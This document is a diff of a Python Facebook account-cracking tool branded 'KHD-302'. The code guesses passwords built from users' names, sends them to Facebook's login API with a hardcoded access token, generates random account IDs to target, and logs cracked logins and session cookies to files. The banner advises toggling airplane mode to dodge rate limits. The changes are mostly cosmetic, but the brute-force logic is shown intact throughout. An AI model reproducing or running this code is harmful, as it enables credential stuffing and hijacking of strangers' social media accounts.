@@ -206,7 +206,7 @@ def setting():
 		print (' [!] Choose Correct Option')
 		exit()
 	clear()
-	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2  \033[1;97m')
+	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')
 	hc = input ("\n [+] Method : ")
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -217,7 +217,7 @@ def setting():
 	passmenu()
 def passmenu():
 	clear()
-	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] FULL NAME PASS')
+	print(logo);print  ('\n [01] FIRST + DIGITS \n [02] ALL NAME PASS \n [03] FULL NAME PASS')
 	passmen=input('\n [#] Select Pass : ')
 	if passmen in ['1','01']:
 		first()
@@ -230,7 +230,7 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
+	print(logo);print( '\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] \033[1;96m~Use Flight Mode 5 Second After Every 10 mint~\033[1;0m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -282,22 +282,17 @@ def name2():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = [nmf]
+			pwv = []
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
+					pwv.append(nmf)
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'786')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -333,10 +328,10 @@ def crack(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;91m [KHD302-CP] {idf} * {pw}')
+				print(f'\r\x1b[1;91m [KHD-302 CP] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/KHD302-CP.txt','a').write('%s\n' % wrt)
+				open('/sdcard/KHD-302 CP.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -371,10 +366,10 @@ def free(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [SUCCESSFUL-KHD] {idf} * {pw}')
+				print(f'\r\x1b[1;92m [KHD-302 OK] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/SUCCESSFUL-KHD','a').write('%s\n' % wrt)
+				open('/sdcard/KHD-302 OK','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -394,17 +389,17 @@ logo = """
  
     
 
-888    d8P   888       888    8888888b.        
-888   d8P    888       888    888   "Y88b       
-888  d8P     888       888    888     888           
-888d88K      8888888888888    888     888    
-8888888b     888       888    888     888      
-888  Y88b    888.      888    888     888      
-888   Y88b   888       888    888  . d88P       
-888    Y88b  888       888.   8888888P" 302
+ 888    d8P   888       888    8888888b.        
+ 888   d8P    888       888    888   "Y88b       
+ 888  d8P     888       888    888     888           
+ 888d88K      8888888888888    888     888    
+ 8888888b     888       888    888     888      
+ 888  Y88b    888.      888    888     888      
+ 888   Y88b   888       888    888  . d88P       
+ 888    Y88b  888       888.   8888888P" 302
                                                                                
 \x1b[1;97m--------------------------------------------------
-\33[1;41mKHD-302 X RSU BRAND REAL FATHER OF HITTLER\33[0m
+\33[1;41m      KHD-302 X RSU BRAND REAL FATHER OF HITTLER    \33[0m
 \x1b[1;97m--------------------------------------------------
 \x1b[1;97m[+] AUTHOR         : KHD 302 BRAND
 \x1b[1;97m[+] FB PAGE.       : ZEE BALOCH
@@ -425,7 +420,7 @@ class Main:
 		print("")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		print("\033[1;37mNOTE : FOR APROVAL LIKE FB PAGE ")
-		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ")
+		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		
 		
 		print("")
@@ -436,7 +431,7 @@ class Main:
 		if baloch in ["", " "]:
 			exit()
 		elif baloch in ["2", "02"]:
-			print("    Thanks♥️")
+			print("    THANK U")
 			exit() 
 		elif baloch in ["1", "01"]:
 			os.system("xdg-open https://m.facebook.com/khdxrsubrand/ ")
@@ -454,18 +449,18 @@ class Main:
 		print(" [+]CLONING MENU")
 		print("\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		print(" \033[1;32m[1]\033[0;92m FILE CLONING ")
-		print(" \033[1;32m[2] PUBLIC CLONING")
+		print(" \033[1;32m[2] FILE CREAT(UNDER WORK)")
 		print(" \033[1;32m[3] PAK RENDOM CLONING ")
-		print(" \33[1;32m[4] 2016 TO 2022 ")
+		print(" \33[1;32m[4] OLD IDZ ")
 		print("\033[1;32m [E] EXIT \n")
-		UZAIR =input(" \033[1;32mSELECT : ")
-		if UZAIR in ["1", "01"]:
+		ZEE =input(" \033[1;32mSELECT : ")
+		if ZEE in ["1", "01"]:
 			File()
-		if UZAIR in ["2", "02"]:
+		if ZEE in ["2", "02"]:
 			Public()
-		if UZAIR in ["3", "03"]:
+		if ZEE in ["3", "03"]:
 			self.old()
-		if UZAIR in ["4", "04"]:
+		if ZEE in ["4", "04"]:
 			self.old2()
 			exit()
 		else:
@@ -892,12 +887,12 @@ class Main:
 				print("\r \033[1;32m[KHD OK]%s | %s\033[1;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("KHD OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("KHD-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[KHD OK] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[KHD-OK] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("KHD OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("KHD-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -907,7 +902,7 @@ class Main:
 	def old2(self):
 		x = 1111111111
 		xx = 9999999999
-		idx = "1000" 
+		idx = "10000" 
 		os.system('clear');print(logo)
 		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
@@ -1320,15 +1315,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[KHD OK] %s | %s\033[0;32m         "%(uid, pw))
+				print("\r \033[1;32m[KHD-OK] %s | %s\033[0;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("KHD OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("KHD-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[KHD OK] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[KHD-OK] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("KHD-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
